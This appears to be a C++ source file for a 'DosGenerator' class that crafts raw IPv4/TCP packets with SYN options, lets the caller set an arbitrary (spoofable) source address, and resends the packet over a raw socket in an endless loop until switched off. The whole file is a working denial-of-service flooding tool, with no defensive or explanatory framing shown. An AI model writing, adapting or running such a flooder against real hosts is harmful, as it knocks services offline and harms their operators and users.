#include "dosgenerator.h"
#include "jpcap/printdata.h"

pcap_t *DosGenerator::get_pcd() const
{
    return pcd_;
}

void DosGenerator::set_pcd(pcap_t *value)
{
    pcd_ = value;
}

int DosGenerator::get_raw_fd() const
{
    return raw_fd_;
}

void DosGenerator::set_raw_fd(int raw_fd)
{
    raw_fd_ = raw_fd;
}

bool DosGenerator::init_iph(uint32_t src_ip, uint32_t dest_ip)
{

    memset(&iph_,0,sizeof(struct iphdr));

    //set ip header
    iph_.version=4;
    iph_.ihl=5;
    iph_.frag_off=htons(IP_DF); //don't flagment set
    iph_.ttl=64;
    iph_.protocol=IPPROTO_TCP;


    iph_.saddr = htonl(src_ip);
    iph_.daddr = htonl(dest_ip);


    return true;


}

bool DosGenerator::init_iph(Ip &src_ip, Ip &dest_ip)
{
    memset(&iph_,0,sizeof(struct iphdr));

    //set ip header
    iph_.version=4;
    iph_.ihl=5;
    iph_.frag_off=htons(IP_DF); //don't flagment set
    iph_.ttl=64;
    iph_.protocol=IPPROTO_TCP;


    iph_.saddr = src_ip.get_ip();
    iph_.daddr = dest_ip.get_ip();


    return true;
}

bool DosGenerator::init_tcph(uint16_t src_port, uint16_t dest_port)
{
    memset(&tcph_,0,sizeof(struct tcphdr));

    //set tcp header
    tcph_.doff=5;
    tcph_.window=htons(1024);
    tcph_.source = htons(src_port);
    tcph_.dest = htons(dest_port);

    return true;

}

bool DosGenerator::set_iph_src(uint32_t &src_ip)
{
    iph_.saddr=htonl(src_ip);

    return true;
}

void DosGenerator::switchPower()
{
    power_ = !power_;
}

void DosGenerator::generate()
{

    iph_.tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr) + sizeof(SynOptions));

    //make packet buf
    uint8_t packet[sizeof(struct iphdr) + sizeof(struct tcphdr) + sizeof(SynOptions)];

    /*set MaximumSegementSize*/
    syn_options_.maximumSegementSize.kind=2; //Maximum Segment Size
    syn_options_.maximumSegementSize.length=4;
    syn_options_.maximumSegementSize.MSSvalue=htons(1420); //set MSS value 1420

    /*set TCP SACK Permitted option*/
    syn_options_.tcpSackPermittedOption.kind=4; //SACK Permitted
    syn_options_.tcpSackPermittedOption.length=2;

    /* set Time Stamps*/
    syn_options_.timestamp.kind=8; //Time Stamp Option
    syn_options_.timestamp.length=10;
    syn_options_.timestamp.timeStampValue=0;
    syn_options_.timestamp.timeStampEchoReply=0;

    //No-Operation is already set

    /* set Window Scale*/
    syn_options_.windowScale.kind=3; //Window Scale
    syn_options_.windowScale.length=3;
    syn_options_.windowScale.shifCount=7;


    //packet fill with ip, tcp, syn option
    memcpy(packet,&iph_,sizeof(struct iphdr));
    memcpy(packet + sizeof(struct iphdr),&tcph_,sizeof(struct tcphdr));
    memcpy(packet + sizeof(struct iphdr) + sizeof(struct tcphdr),&syn_options_,sizeof(SynOptions));


    sockaddr_in dst_addr;
    dst_addr.sin_family=AF_INET;
    dst_addr.sin_addr.s_addr=iph_.daddr;
    dst_addr.sin_port = tcph_.dest;


    while(power_)
    {
        //infinity send until power off
        if(sendto(raw_fd_,packet,sizeof(packet),MSG_EOR,(struct sockaddr *)&dst_addr,(socklen_t)sizeof(dst_addr))<0)
        {
            std::cout<<"send to error! here's packet."<<std::endl;
            printByHexData(packet,sizeof(packet));

        }
    }


}

DosGenerator::DosGenerator()
{

}

bool DosGenerator::pcd_init(const char * dev)
{
    pcd_ = pcap_open_live(dev,BUFSIZ,0,1,pcap_error_buf_);
    if(pcd_==NULL)
        return false;

    return true;
}

bool DosGenerator::raw_init(int type)
{
    if((raw_fd_ = socket(AF_INET,SOCK_RAW,type))<0)
        return false;

    return true;
}
